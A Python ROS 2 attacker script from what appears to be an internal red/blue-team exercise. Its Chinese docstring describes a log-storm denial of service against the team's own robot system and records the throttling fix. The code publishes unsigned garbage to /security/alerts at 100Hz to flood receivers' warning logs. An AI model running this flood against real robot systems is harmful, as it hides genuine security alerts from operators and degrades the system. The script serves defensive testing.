#!/usr/bin/env python3
"""攻擊 N15 — Unsigned message flood log storm DoS.

藍方自己預判的攻擊。漏洞：
    patrol/mission/system/burger_env 的 verify_alert 失敗時都印 warn log。
    若 log 沒 throttle，attacker 100Hz publish 未簽章垃圾 →
    4 個 receiver 每個 100Hz 印 log → 400 logs/sec → log storm DoS：
        - 操作員看不到真實警報
        - log file 撐爆
        - terminal/journald 大量 IO 拖慢系統

藍方修補：
    所有 verify_alert 失敗的 warn log 都加 throttle_duration_sec=5.0
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import DurabilityPolicy, QoSProfile, ReliabilityPolicy
from std_msgs.msg import String


class LogStormAttacker(Node):

    def __init__(self):
        super().__init__('attacker_log_storm')
        qos = QoSProfile(
            depth=10,
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
        )
        self._pub = self.create_publisher(String, '/security/alerts', qos)
        self._n = 0
        # 100Hz flood
        self.create_timer(0.01, self._flood)
        self.get_logger().error(
            '☠️ 100Hz publish 未簽章垃圾到 /security/alerts — 期待 receiver 印爆 log'
        )

    def _flood(self):
        m = String()
        m.data = f'GARBAGE_no_sig_{self._n}'
        self._pub.publish(m)
        self._n += 1


def main():
    rclpy.init()
    node = LogStormAttacker()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 6.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.01)
    finally:
        node.get_logger().error(f'⏹ 結束，總共 publish {node._n} 筆未簽章垃圾')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
